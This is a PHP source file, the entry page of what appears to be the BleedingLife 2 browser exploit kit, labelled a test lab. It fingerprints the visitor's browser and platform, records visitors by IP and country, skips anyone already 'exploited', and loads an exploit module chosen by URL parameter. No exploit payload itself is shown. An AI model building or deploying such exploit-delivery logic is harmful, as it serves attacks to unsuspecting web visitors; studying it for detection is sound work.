<?
/*
BleedingLife 2 - Exploit Test Lab
Copyright (C) 2011 Blackhat Academy

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

include_once('config.php');

include("include/browser.php");

$browser = new Browser();
$data = $browser->identification();

if(($data['browser'] != "FIREFOX" && $data['browser'] != "CHROME" && $data['browser'] != "SAFARI" && $data['browser'] != "OPERA" && $data['browser'] != "MSIE") || $data['platform'] == "OTHER"){
	exit();
}

include_once('include/sql.php');
include_once('include/visitors.php');
$sql = new CSQL($sqlSettings);
$sql->open();
	
$cvisitors = new CVisitors($sql, $sqlSettings);
$exploited = $cvisitors->checkVisitor($_SERVER['HTTP_USER_AGENT'], $cvisitors->getIpAddr(), $cvisitors->getIpAddrCountry($cvisitors->getIpAddr()));
$sql->close();

if($exploited){
	exit();
}


$page = $_GET["e"];

$pos = strpos($page, "..");


if($page != "" && isset($page) && $pos === false ){
	$inc = "modules/" . $page . ".php";
	
	if(file_exists($inc)){
		
		require_once($inc);
	
	}else{
		
		require_once("modules/index.php");

	}

}else{
	
	require_once("modules/index.php");

}



?>
